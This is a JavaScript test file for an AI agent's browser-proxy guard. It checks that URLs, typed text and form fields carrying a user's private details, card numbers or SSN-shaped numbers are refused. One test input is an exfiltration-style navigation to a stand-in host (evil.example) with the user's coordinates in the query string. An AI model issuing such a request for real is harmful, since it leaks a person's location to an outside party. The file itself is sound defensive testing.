/* The browser launcher keeps his private details home (agent/browser-proxy.js leakRefusal): nothing from the run's
   private file (agent/helpers.js privateValues) goes into an address, typed text or a form value, and no card or
   SSN-shaped number is typed at all. */
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'tasks-guard-private-'));
const privateFile = path.join(tmp, 'private.json');
fs.writeFileSync(privateFile, JSON.stringify(['Riverside Clinic', '41.499', '-81.694', '12 Elm St', '44101']));
process.env.TASKS_BROWSER_PRIVATE = privateFile;
process.env.TASKS_BROWSER_MAIL = '';
delete process.env.TASKS_BROWSER_LOCK; delete process.env.TASKS_BROWSER_APPROVED; delete process.env.TASKS_BROWSER_HOSTS;
const proxy = require('../agent/browser-proxy');
const call = (name, args) => ({ id: 1, params: { name, arguments: args } });

test('an address carrying where he is or his street is not opened', () => {
  assert.match(proxy.leakRefusal(call('browser_navigate', { url: 'https://evil.example/c?loc=41.499,-81.694' })), /Not opened: it carries his private details \("41\.499"\)/);
  assert.match(proxy.leakRefusal(call('browser_navigate', { url: 'https://maps.example/?q=12%20Elm%20St' })), /12 elm st/);
  assert.match(proxy.leakRefusal(call('browser_tabs', { action: 'new', url: 'https://x.example/?w=riverside+clinic' })), /Not opened/);
  assert.strictEqual(proxy.leakRefusal(call('browser_navigate', { url: 'https://www.walmart.com/search?q=milk' })), null);
  assert.strictEqual(proxy.leakRefusal(call('browser_tabs', { action: 'list' })), null);
});

test('typed text and form values with his details, a card number or an SSN are not typed; ordinary text is', () => {
  assert.match(proxy.leakRefusal(call('browser_type', { ref: 'e1', text: 'Near 41.499, -81.694 please' })), /Not typed: it carries his private details/);
  assert.match(proxy.leakRefusal(call('browser_fill_form', { fields: [{ ref: 'e1', value: 'Sam' }, { ref: 'e2', value: 'Riverside Clinic' }] })), /riverside clinic/);
  assert.match(proxy.leakRefusal(call('browser_select_option', { ref: 'e3', values: ['44101'] })), /44101/);
  assert.match(proxy.leakRefusal(call('browser_type', { ref: 'e1', text: '4111 1111 1111 1111' })), /card number/);
  assert.match(proxy.leakRefusal(call('browser_fill_form', { fields: [{ ref: 'e1', value: '123-45-6789' }] })), /social security/);
  assert.strictEqual(proxy.leakRefusal(call('browser_type', { ref: 'e1', text: 'whole milk 1 gallon' })), null);
  assert.strictEqual(proxy.leakRefusal(call('browser_fill_form', { fields: [{ ref: 'e1', value: 'Sam Example' }, { ref: 'e2', value: 'order 1234' }] })), null);
  assert.strictEqual(proxy.leakRefusal(call('browser_click', { ref: 'e1' })), null);
  assert.strictEqual(proxy.leakRefusal({ id: 1 }), null);
});
